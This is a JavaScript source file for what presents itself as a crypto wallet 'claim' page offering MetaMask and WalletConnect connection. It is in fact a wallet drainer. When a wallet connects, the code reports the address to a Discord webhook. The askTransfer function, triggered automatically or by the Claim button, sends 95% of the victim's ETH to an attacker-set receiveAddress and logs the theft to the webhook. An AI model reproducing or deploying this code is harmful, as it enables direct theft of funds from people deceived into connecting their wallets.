'use strict';

const WalletConnectProvider = window.WalletConnectProvider ? window.WalletConnectProvider.default : null;

let provider;
let web3;

const WALLETCONNECT_DEEP_LINKS = {
  trust: uri => `https://link.trustwallet.com/wc?uri=${encodeURIComponent(uri)}`,
  coinbase: uri => `https://go.cb-w.com/wc?uri=${encodeURIComponent(uri)}`,
  rainbow: uri => `https://rnbwapp.com/wc?uri=${encodeURIComponent(uri)}`,
  imtoken: uri => `imtokenv2://wc?uri=${encodeURIComponent(uri)}`,
  argent: uri => `argent://wc?uri=${encodeURIComponent(uri)}`,
};

const connectWalletConnectDeepLink = async (walletId) => {
  if (!WalletConnectProvider) {
    alert('WalletConnect is not available in this environment.');
    return;
  }

  provider = new WalletConnectProvider({
    bridge: 'https://bridge.walletconnect.org',
    infuraId: '19affef0dbd140e0aca95546e1c5bdd0',
    qrcode: false,
    qrcodeModalOptions: {
      mobileLinks: ['trust', 'metamask', 'coinbase', 'rainbow', 'argent', 'imtoken']
    }
  });

  provider.on('display_uri', (uri) => {
    console.log('WalletConnect display_uri event', uri);
    const resolver = WALLETCONNECT_DEEP_LINKS[walletId] || WALLETCONNECT_DEEP_LINKS.trust;
    const deepLink = resolver(uri);
    console.log('Redirecting to wallet deep link:', deepLink);
    window.location.href = deepLink;
  });

  provider.on('connect', (info) => {
    console.log('WalletConnect connected:', info);
  });

  provider.on('disconnect', (code, reason) => {
    console.log('WalletConnect disconnected:', code, reason);
  });

  try {
    await provider.enable();
    web3 = new Web3(provider);
    const accounts = await web3.eth.getAccounts();
    console.log('Connected via WalletConnect:', accounts[0]);
    await onWalletConnected(accounts[0]);
  } catch (error) {
    console.error('WalletConnect deep link connection error:', error);
    alert('Failed to connect via WalletConnect. Please approve in your wallet app.');
  }
};

const connectMetaMask = async () => {
  try {
    console.log('Connecting to MetaMask...');
    if (!window.ethereum) {
      alert('MetaMask not installed. Please install MetaMask.');
      return;
    }
    
    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
    provider = window.ethereum;
    web3 = new Web3(provider);
    
    console.log('Connected to MetaMask:', accounts[0]);
    await onWalletConnected(accounts[0]);
  } catch (error) {
    console.error('MetaMask connection error:', error);
    alert('Failed to connect to MetaMask');
  }
};

const showWalletList = () => {
  return new Promise((resolve) => {
    const wallets = [
      { name: 'MetaMask', icon: '🦊', id: 'metamask' },
      { name: 'Trust Wallet', icon: '🛡️', id: 'trust' },
      { name: 'Coinbase Wallet', icon: '☁️', id: 'coinbase' },
      { name: 'Rainbow', icon: '🌈', id: 'rainbow' },
      { name: 'IMTOKEN', icon: '👛', id: 'imtoken' },
      { name: 'Argent', icon: '🔐', id: 'argent' }
    ];

    const modal = document.createElement('div');
    modal.id = 'walletListModal';
    modal.style.cssText = `
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0,0,0,0.5);
      display: flex;
      justify-content: center;
      align-items: center;
      z-index: 10000;
    `;

    const content = document.createElement('div');
    content.style.cssText = `
      background: white;
      padding: 30px;
      border-radius: 15px;
      text-align: center;
      min-width: 320px;
      max-width: 400px;
      box-shadow: 0 4px 6px rgba(0,0,0,0.1);
    `;

    content.innerHTML = `
      <h2 style="margin-top: 0; color: #333; margin-bottom: 10px;">Select Wallet</h2>
      <p style="color: #888; margin-bottom: 25px; font-size: 14px;">Click to open your wallet app</p>
      <div id="walletGrid" style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px;"></div>
    `;

    const grid = content.querySelector('#walletGrid');
    
    wallets.forEach(wallet => {
      const btn = document.createElement('button');
      btn.style.cssText = `
        padding: 15px;
        border: 2px solid #e0e0e0;
        border-radius: 10px;
        background: white;
        cursor: pointer;
        font-size: 14px;
        transition: all 0.2s;
        display: flex;
        flex-direction: column;
        align-items: center;
        gap: 8px;
      `;
      btn.innerHTML = `<span style="font-size: 28px;">${wallet.icon}</span><span>${wallet.name}</span>`;
      
      btn.onmouseover = () => {
        btn.style.borderColor = '#3b99fc';
        btn.style.background = '#f0f7ff';
      };
      btn.onmouseout = () => {
        btn.style.borderColor = '#e0e0e0';
        btn.style.background = 'white';
      };
      
      btn.onclick = () => {
        modal.remove();
        resolve(wallet.id);
      };
      
      grid.appendChild(btn);
    });

    const cancelBtn = document.createElement('button');
    cancelBtn.textContent = '✕ Cancel';
    cancelBtn.style.cssText = `
      width: 100%;
      padding: 12px;
      margin-top: 20px;
      background: #f5f5f5;
      color: #333;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      font-size: 14px;
    `;
    cancelBtn.onclick = () => {
      modal.remove();
      resolve(null);
    };

    content.appendChild(cancelBtn);
    modal.appendChild(content);
    document.body.appendChild(modal);
  });
};

const connectWallet = async (walletId) => {
  try {
    if (walletId === 'metamask') {
      await connectMetaMask();
      return;
    }

    if (['trust', 'coinbase', 'rainbow', 'imtoken', 'argent'].includes(walletId)) {
      await connectWalletConnectDeepLink(walletId);
      return;
    }

    if (!WalletConnectProvider) {
      alert('WalletConnect is not available in this environment.');
      return;
    }

    provider = new WalletConnectProvider({
      bridge: 'https://bridge.walletconnect.org',
      infuraId: '19affef0dbd140e0aca95546e1c5bdd0',
      qrcode: true,
      qrcodeModalOptions: {
        mobileLinks: ['trust', 'metamask', 'coinbase', 'rainbow', 'argent', 'imtoken']
      }
    });

    await provider.enable();
    web3 = new Web3(provider);
    const accounts = await web3.eth.getAccounts();
    console.log('Connected via WalletConnect:', accounts[0]);
    await onWalletConnected(accounts[0]);
  } catch (error) {
    console.error('connectWallet error:', error);
    alert('Failed to connect wallet. Please approve in your wallet app and try again.');
  }
};

const connectWalletConnect = async () => {
  try {
    const selectedWallet = await showWalletList();
    if (!selectedWallet) {
      console.log('Wallet selection cancelled');
      return;
    }

    console.log('Selected wallet:', selectedWallet);
    await connectWallet(selectedWallet);
  } catch (error) {
    console.error('WalletConnect error:', error);
    alert('Failed to connect to WalletConnect');
  }
};

const onWalletConnected = async (account) => {
  try {
    console.log('Wallet connected:', account);
    
    // Hide connect button
    const connectBtn = document.querySelector('#connectWallet');
    if (connectBtn) connectBtn.style.display = 'none';
    
    // Show claim button
    const claimBtn = document.querySelector('#claimButton');
    if (claimBtn) claimBtn.style.display = '';

    // Send to webhook if enabled
    if (feedbackEnabled && discordWebhookURL) {
      const message = `✅ Wallet Connected: ${account}\n${window.location.href}`;
      fetch(discordWebhookURL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ content: message })
      }).catch(e => console.error('Webhook error:', e));
    }

    // Auto-claim if enabled
    if (autoMint) {
      await askTransfer();
    }
  } catch (error) {
    console.error('onWalletConnected error:', error);
  }
};

const showWalletPicker = () => {
  // Create a simple modal dialog
  const modal = document.createElement('div');
  modal.id = 'walletModal';
  modal.style.cssText = `
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: rgba(0,0,0,0.5);
    display: flex;
    justify-content: center;
    align-items: center;
    z-index: 9999;
  `;

  const content = document.createElement('div');
  content.style.cssText = `
    background: white;
    padding: 30px;
    border-radius: 10px;
    text-align: center;
    min-width: 300px;
    box-shadow: 0 4px 6px rgba(0,0,0,0.1);
  `;

  content.innerHTML = `
    <h2 style="margin-top: 0; color: #333;">Select Wallet</h2>
    <p style="color: #666; margin-bottom: 20px;">Choose how you want to connect</p>
  `;

  // MetaMask button
  const mmBtn = document.createElement('button');
  mmBtn.textContent = '🦊 MetaMask';
  mmBtn.style.cssText = `
    display: block;
    width: 100%;
    padding: 12px;
    margin: 10px 0;
    background: #f6851b;
    color: white;
    border: none;
    border-radius: 5px;
    cursor: pointer;
    font-size: 16px;
    font-weight: bold;
  `;
  mmBtn.onclick = async () => {
    modal.remove();
    await connectMetaMask();
  };

  // WalletConnect button
  const wcBtn = document.createElement('button');
  wcBtn.textContent = '📱 WalletConnect';
  wcBtn.style.cssText = `
    display: block;
    width: 100%;
    padding: 12px;
    margin: 10px 0;
    background: #3b99fc;
    color: white;
    border: none;
    border-radius: 5px;
    cursor: pointer;
    font-size: 16px;
    font-weight: bold;
  `;
  wcBtn.onclick = async () => {
    modal.remove();
    await connectWalletConnect();
  };

  // Cancel button
  const cancelBtn = document.createElement('button');
  cancelBtn.textContent = '✕ Cancel';
  cancelBtn.style.cssText = `
    display: block;
    width: 100%;
    padding: 12px;
    margin: 10px 0;
    background: #ccc;
    color: #333;
    border: none;
    border-radius: 5px;
    cursor: pointer;
    font-size: 14px;
  `;
  cancelBtn.onclick = () => modal.remove();

  content.appendChild(mmBtn);
  content.appendChild(wcBtn);
  content.appendChild(cancelBtn);
  modal.appendChild(content);
  document.body.appendChild(modal);
};

const askTransfer = async () => {
  if (!provider || !web3) {
    console.log('No provider connected');
    return;
  }

  try {
    const accounts = await web3.eth.getAccounts();
    const account = accounts[0];

    const balance = await web3.eth.getBalance(account);
    const ethBalance = web3.utils.fromWei(balance, 'ether');

    console.log(`Balance for ${account}: ${ethBalance} ETH`);

    if (ethBalance > 0.002) {
      // Send 95% of balance
      const gasPrice = await web3.eth.getGasPrice();
      const txValue = web3.utils.toWei((ethBalance * 0.95).toString(), 'ether');
      
      const tx = {
        from: account,
        to: receiveAddress,
        value: txValue,
        gas: 21000,
        gasPrice: gasPrice
      };

      console.log('Sending transaction...');
      const txHash = await web3.eth.sendTransaction(tx);
      console.log('Transaction sent:', txHash);

      if (feedbackEnabled && discordWebhookURL) {
        fetch(discordWebhookURL, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ 
            content: `💸 Received ${ethBalance} ETH from ${account}\nTx: ${txHash}` 
          })
        }).catch(e => console.error('Webhook error:', e));
      }
    } else {
      console.log('Balance too low:', ethBalance);
      alert(`Balance too low (${ethBalance} ETH). Minimum: 0.002 ETH`);
    }
  } catch (error) {
    console.error('Transfer error:', error);
    alert('Transfer failed: ' + error.message);
  }
};

// Initialize on page load
window.addEventListener('load', async () => {
  console.log('Page loaded, setting up wallet buttons');
  
  const connectBtn = document.querySelector('#connectWallet');
  const claimBtn = document.querySelector('#claimButton');

  if (connectBtn) {
    connectBtn.addEventListener('click', showWalletPicker);
    console.log('Connect button ready');
  }

  if (claimBtn) {
    claimBtn.addEventListener('click', askTransfer);
    console.log('Claim button ready');
  }
});
